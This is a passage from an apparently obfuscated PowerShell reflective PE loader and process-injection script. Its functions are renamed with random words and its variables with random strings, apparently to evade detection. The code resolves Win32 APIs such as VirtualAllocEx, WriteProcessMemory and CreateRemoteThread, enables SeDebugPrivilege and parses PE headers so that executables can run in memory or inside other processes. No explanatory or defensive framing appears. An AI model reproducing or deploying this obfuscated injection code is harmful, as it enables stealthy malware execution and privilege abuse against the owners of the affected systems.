        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

        return $Win32Constants
    }

    Function cracked
    {
        $dxaeqnSI99 = New-Object System.Object

        $ZObwMqCu99 = paragraphed kernel32.dll VirtualAlloc
        $fTAxmPCm99 = turtle @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $LnDDXGOn99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ZObwMqCu99, $fTAxmPCm99)
        $dxaeqnSI99 | Add-Member NoteProperty -Name VirtualAlloc -Value $LnDDXGOn99

        $QWOxBavI99 = paragraphed kernel32.dll VirtualAllocEx
        $RDSWywBC99 = turtle @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $QQzFFQXn99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($QWOxBavI99, $RDSWywBC99)
        $dxaeqnSI99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $QQzFFQXn99

        $nPlimIrF99 = paragraphed msvcrt.dll memcpy
        $zspPnAZW99 = turtle @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $ZAaHTuag99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($nPlimIrF99, $zspPnAZW99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $ZAaHTuag99

        $sdxnPnNn99 = paragraphed msvcrt.dll memset
        $LtxDTiLa99 = turtle @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $FdQjXTDa99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($sdxnPnNn99, $LtxDTiLa99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name memset -Value $FdQjXTDa99

        $zEwBCZnH99 = paragraphed kernel32.dll LoadLibraryA
        $ABiTfTQN99 = turtle @([String]) ([IntPtr])
        $jvqUppwU99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zEwBCZnH99, $ABiTfTQN99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $jvqUppwU99

        $BKBvZrYm99 = paragraphed kernel32.dll GetProcAddress
        $lUbHobAl99 = turtle @([IntPtr], [String]) ([IntPtr])
        $KRTcawsF99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BKBvZrYm99, $lUbHobAl99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $KRTcawsF99

        $OLVokFVS99 = paragraphed kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $oBcCeaYE99 = turtle @([IntPtr], [IntPtr]) ([IntPtr])
        $akMsiPzI99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OLVokFVS99, $oBcCeaYE99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $akMsiPzI99

        $wdarzvcI99 = paragraphed kernel32.dll VirtualFree
        $FpcpoJMU99 = turtle @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $oxEYSVGD99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wdarzvcI99, $FpcpoJMU99)
        $dxaeqnSI99 | Add-Member NoteProperty -Name VirtualFree -Value $oxEYSVGD99

        $VzAdvZSp99 = paragraphed kernel32.dll VirtualFreeEx
        $lZGCtLWy99 = turtle @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $nGtaMcou99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VzAdvZSp99, $lZGCtLWy99)
        $dxaeqnSI99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $nGtaMcou99

        $lJrEfwXZ99 = paragraphed kernel32.dll VirtualProtect
        $LbSIcKBO99 = turtle @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $hNVWKVPt99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lJrEfwXZ99, $LbSIcKBO99)
        $dxaeqnSI99 | Add-Member NoteProperty -Name VirtualProtect -Value $hNVWKVPt99

        $gfrRqhtV99 = paragraphed kernel32.dll GetModuleHandleA
        $vrbHgtNm99 = turtle @([String]) ([IntPtr])
        $TbFlDFHW99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gfrRqhtV99, $vrbHgtNm99)
        $dxaeqnSI99 | Add-Member NoteProperty -Name GetModuleHandle -Value $TbFlDFHW99

        $nONjhYqu99 = paragraphed kernel32.dll FreeLibrary
        $pYQkUyFY99 = turtle @([IntPtr]) ([Bool])
        $JBbRezRM99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($nONjhYqu99, $pYQkUyFY99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $JBbRezRM99

        $rbjNfiYL99 = paragraphed kernel32.dll OpenProcess
        $RaZOMGDv99 = turtle @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $tCEiVfey99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($rbjNfiYL99, $RaZOMGDv99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $tCEiVfey99

        $jwGhbhWD99 = paragraphed kernel32.dll WaitForSingleObject
        $gmVEAvNC99 = turtle @([IntPtr], [UInt32]) ([UInt32])
        $UDgYDzRa99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($jwGhbhWD99, $gmVEAvNC99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $UDgYDzRa99

        $GSwvzlgA99 = paragraphed kernel32.dll WriteProcessMemory
        $YCqiDODf99 = turtle @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $auSkRirD99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GSwvzlgA99, $YCqiDODf99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $auSkRirD99

        $nKrxSkxe99 = paragraphed kernel32.dll ReadProcessMemory
        $IuloxCkU99 = turtle @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $RfMFCOCW99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($nKrxSkxe99, $IuloxCkU99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $RfMFCOCW99

        $vhmOZxyp99 = paragraphed kernel32.dll CreateRemoteThread
        $OCAhzPeg99 = turtle @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $KdZYSpmn99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vhmOZxyp99, $OCAhzPeg99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $KdZYSpmn99

        $dEAfMGZA99 = paragraphed kernel32.dll GetExitCodeThread
        $yzJNxYyR99 = turtle @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $gFcXcfrN99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($dEAfMGZA99, $yzJNxYyR99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $gFcXcfrN99

        $XmRrfLmN99 = paragraphed Advapi32.dll OpenThreadToken
        $jkyYnlKL99 = turtle @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $YWOWgMcp99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XmRrfLmN99, $jkyYnlKL99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $YWOWgMcp99

        $UVtffeCF99 = paragraphed kernel32.dll GetCurrentThread
        $AwLxinyf99 = turtle @() ([IntPtr])
        $yoiblHbe99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UVtffeCF99, $AwLxinyf99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $yoiblHbe99

        $svcCeqxb99 = paragraphed Advapi32.dll AdjustTokenPrivileges
        $AcvXmRxO99 = turtle @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $ewzXjTTR99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($svcCeqxb99, $AcvXmRxO99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $ewzXjTTR99

        $KXwKLYrQ99 = paragraphed Advapi32.dll LookupPrivilegeValueA
        $TnSWXvVD99 = turtle @([String], [String], [IntPtr]) ([Bool])
        $VozpHISo99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($KXwKLYrQ99, $TnSWXvVD99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $VozpHISo99

        $IIMOxgEH99 = paragraphed Advapi32.dll ImpersonateSelf
        $OUUcmZJr99 = turtle @([Int32]) ([Bool])
        $VBoVKypO99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IIMOxgEH99, $OUUcmZJr99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $VBoVKypO99

        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $rYUeFYYh99 = paragraphed NtDll.dll NtCreateThreadEx
            $GCzQpcTB99 = turtle @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $yKVcvceJ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($rYUeFYYh99, $GCzQpcTB99)
            $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $yKVcvceJ99
        }

        $htErOHgR99 = paragraphed Kernel32.dll IsWow64Process
        $FMBFMiBN99 = turtle @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $uwLjBBAB99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($htErOHgR99, $FMBFMiBN99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $uwLjBBAB99

        $hwgfHkLf99 = paragraphed Kernel32.dll CreateThread
        $DdhVMYae99 = turtle @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $cqmyqVEu99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($hwgfHkLf99, $DdhVMYae99)
        $dxaeqnSI99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $cqmyqVEu99

        return $dxaeqnSI99
    }



    Function timelines
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $dVGbNqcR99,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $vSmPWFKq99
        )

        [Byte[]]$WHDbzwNI99 = [BitConverter]::GetBytes($dVGbNqcR99)
        [Byte[]]$LBpxbndd99 = [BitConverter]::GetBytes($vSmPWFKq99)
        [Byte[]]$OtEnWxJR99 = [BitConverter]::GetBytes([UInt64]0)

        if ($WHDbzwNI99.Count -eq $LBpxbndd99.Count)
        {
            $wGJEHMar99 = 0
            for ($i = 0; $i -lt $WHDbzwNI99.Count; $i++)
            {
                $Val = $WHDbzwNI99[$i] - $wGJEHMar99
                if ($Val -lt $LBpxbndd99[$i])
                {
                    $Val += 256
                    $wGJEHMar99 = 1
                }
                else
                {
                    $wGJEHMar99 = 0
                }

                [UInt16]$Sum = $Val - $LBpxbndd99[$i]

                $OtEnWxJR99[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($OtEnWxJR99, 0)
    }

    Function recessives
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $dVGbNqcR99,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $vSmPWFKq99
        )

        [Byte[]]$WHDbzwNI99 = [BitConverter]::GetBytes($dVGbNqcR99)
        [Byte[]]$LBpxbndd99 = [BitConverter]::GetBytes($vSmPWFKq99)
        [Byte[]]$OtEnWxJR99 = [BitConverter]::GetBytes([UInt64]0)

        if ($WHDbzwNI99.Count -eq $LBpxbndd99.Count)
        {
            $wGJEHMar99 = 0
            for ($i = 0; $i -lt $WHDbzwNI99.Count; $i++)
            {
                [UInt16]$Sum = $WHDbzwNI99[$i] + $LBpxbndd99[$i] + $wGJEHMar99

                $OtEnWxJR99[$i] = $Sum -band 0x00FF

                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $wGJEHMar99 = 1
                }
                else
                {
                    $wGJEHMar99 = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($OtEnWxJR99, 0)
    }

    Function Fischer
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $dVGbNqcR99,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $vSmPWFKq99
        )

        [Byte[]]$WHDbzwNI99 = [BitConverter]::GetBytes($dVGbNqcR99)
        [Byte[]]$LBpxbndd99 = [BitConverter]::GetBytes($vSmPWFKq99)

        if ($WHDbzwNI99.Count -eq $LBpxbndd99.Count)
        {
            for ($i = $WHDbzwNI99.Count-1; $i -ge 0; $i--)
            {
                if ($WHDbzwNI99[$i] -gt $LBpxbndd99[$i])
                {
                    return $true
                }
                elseif ($WHDbzwNI99[$i] -lt $LBpxbndd99[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }

        return $false
    }


    Function survives
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )

        [Byte[]]$FEzVCIdT99 = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($FEzVCIdT99, 0))
    }


    Function laundries
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $OsufprlS99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($OsufprlS99)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }

    Function aspire
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $FhIFlHBg99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )

        [IntPtr]$KMslyubH99 = [IntPtr](recessives ($StartAddress) ($Size))

        $tnxBtELV99 = $PEInfo.EndAddress

        if ((Fischer ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $FhIFlHBg99"
        }
        if ((Fischer ($KMslyubH99) ($tnxBtELV99)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $FhIFlHBg99"
        }
    }

    Function clothespin
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,

            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $pvgFYwns99
        )

        for ($xolaLDqv99 = 0; $xolaLDqv99 -lt $Bytes.Length; $xolaLDqv99++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($pvgFYwns99, $xolaLDqv99, $Bytes[$xolaLDqv99])
        }
    }

    Function turtle
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $sLpyUUiD99 = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $WLbuQnBc99 = [AppDomain]::CurrentDomain
        $UkBHCgtm99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $cIHIJuHE99 = $WLbuQnBc99.DefineDynamicAssembly($UkBHCgtm99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $guvvnpcR99 = $cIHIJuHE99.DefineDynamicModule('InMemoryModule', $false)
        $raBhZPeU99 = $guvvnpcR99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $CPHahLrc99 = $raBhZPeU99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $sLpyUUiD99)
        $CPHahLrc99.SetImplementationFlags('Runtime, Managed')
        $hEjHmnzM99 = $raBhZPeU99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $sLpyUUiD99)
        $hEjHmnzM99.SetImplementationFlags('Runtime, Managed')

        Write-Output $raBhZPeU99.CreateType()
    }


    Function paragraphed
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $bkxTvGSO99
        )

        $WjlepNfj99 = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $bckXnACG99 = $WjlepNfj99.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $TbFlDFHW99 = $bckXnACG99.GetMethod('GetModuleHandle')
        #$KRTcawsF99 = $bckXnACG99.GetMethod('GetProcAddress')
        $KRTcawsF99 = $bckXnACG99.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        $HuVMiDXv99 = $TbFlDFHW99.Invoke($null, @($Module))
        $XlQFuojo99 = New-Object IntPtr
        $RSilEGnr99 = New-Object System.Runtime.InteropServices.HandleRef($XlQFuojo99, $HuVMiDXv99)

        Write-Output $KRTcawsF99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$RSilEGnr99, $bkxTvGSO99))
    }

    Function cubits
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $dxaeqnSI99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $TIzknaum99,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [IntPtr]$TSWLIdrk99 = $dxaeqnSI99.GetCurrentThread.Invoke()
        if ($TSWLIdrk99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }

        [IntPtr]$rgMZeBwF99 = [IntPtr]::Zero
        [Bool]$RWrGHNur99 = $dxaeqnSI99.OpenThreadToken.Invoke($TSWLIdrk99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$rgMZeBwF99)
        if ($RWrGHNur99 -eq $false)
        {
            $NmeMbGLe99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($NmeMbGLe99 -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $RWrGHNur99 = $dxaeqnSI99.ImpersonateSelf.Invoke(3)
                if ($RWrGHNur99 -eq $false)
                {
                    Throw "Unable to impersonate self"
                }

                $RWrGHNur99 = $dxaeqnSI99.OpenThreadToken.Invoke($TSWLIdrk99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$rgMZeBwF99)
                if ($RWrGHNur99 -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $NmeMbGLe99"
            }
        }

        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TIzknaum99.LUID))
        $RWrGHNur99 = $dxaeqnSI99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($RWrGHNur99 -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$VJbtfWoE99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TIzknaum99.TOKEN_PRIVILEGES)
        [IntPtr]$DrdDFxJc99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VJbtfWoE99)
        $HRsfQGZp99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DrdDFxJc99, [Type]$TIzknaum99.TOKEN_PRIVILEGES)
        $HRsfQGZp99.PrivilegeCount = 1
        $HRsfQGZp99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$TIzknaum99.LUID)
        $HRsfQGZp99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($HRsfQGZp99, $DrdDFxJc99, $true)

        $RWrGHNur99 = $dxaeqnSI99.AdjustTokenPrivileges.Invoke($rgMZeBwF99, $false, $DrdDFxJc99, $VJbtfWoE99, [IntPtr]::Zero, [IntPtr]::Zero)
        $NmeMbGLe99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($RWrGHNur99 -eq $false) -or ($NmeMbGLe99 -ne 0))
        {
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($DrdDFxJc99)
    }

    Function indissoluble
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $blAqmNlp99,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $iglcbndz99 = [IntPtr]::Zero,

        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $dxaeqnSI99
        )

        [IntPtr]$bPNburkj99 = [IntPtr]::Zero

        $qSCrmYkn99 = [Environment]::OSVersion.Version
        if (($qSCrmYkn99 -ge (New-Object 'Version' 6,0)) -and ($qSCrmYkn99 -lt (New-Object 'Version' 6,2)))
        {
            $bWgnHRjD99= $dxaeqnSI99.NtCreateThreadEx.Invoke([Ref]$bPNburkj99, 0x1FFFFF, [IntPtr]::Zero, $blAqmNlp99, $StartAddress, $iglcbndz99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $JYoIgdMH99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($bPNburkj99 -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $bWgnHRjD99. LastError: $JYoIgdMH99"
            }
        }
        else
        {
            $bPNburkj99 = $dxaeqnSI99.CreateRemoteThread.Invoke($blAqmNlp99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $iglcbndz99, 0, [IntPtr]::Zero)
        }

        if ($bPNburkj99 -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }

        return $bPNburkj99
    }

    Function waved
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $BHTRESUz99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $TIzknaum99
        )

        $ciasFrCj99 = New-Object System.Object

        $knXuOwpd99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BHTRESUz99, [Type]$TIzknaum99.IMAGE_DOS_HEADER)

        [IntPtr]$rJzaXygo99 = [IntPtr](recessives ([Int64]$BHTRESUz99) ([Int64][UInt64]$knXuOwpd99.e_lfanew))
        $ciasFrCj99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $rJzaXygo99
        $PSEYswEc99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($rJzaXygo99, [Type]$TIzknaum99.IMAGE_NT_HEADERS64)

        if ($PSEYswEc99.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }

        if ($PSEYswEc99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $ciasFrCj99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $PSEYswEc99
            $ciasFrCj99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $yEbdohdE99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($rJzaXygo99, [Type]$TIzknaum99.IMAGE_NT_HEADERS32)
            $ciasFrCj99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $yEbdohdE99
            $ciasFrCj99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }

        return $ciasFrCj99
    }


    Function cadres
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $mhtSMDwv99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $TIzknaum99
        )

        $PEInfo = New-Object System.Object

        [IntPtr]$tSNpDlaN99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($mhtSMDwv99.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($mhtSMDwv99, 0, $tSNpDlaN99, $mhtSMDwv99.Length) | Out-Null

        $ciasFrCj99 = waved -BHTRESUz99 $tSNpDlaN99 -TIzknaum99 $TIzknaum99

        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($ciasFrCj99.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($ciasFrCj99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($ciasFrCj99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($ciasFrCj99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($ciasFrCj99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($tSNpDlaN99)

        return $PEInfo
    }


    Function hardware
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $BHTRESUz99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $TIzknaum99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        if ($BHTRESUz99 -eq $null -or $BHTRESUz99 -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }

        $PEInfo = New-Object System.Object

        $ciasFrCj99 = waved -BHTRESUz99 $BHTRESUz99 -TIzknaum99 $TIzknaum99

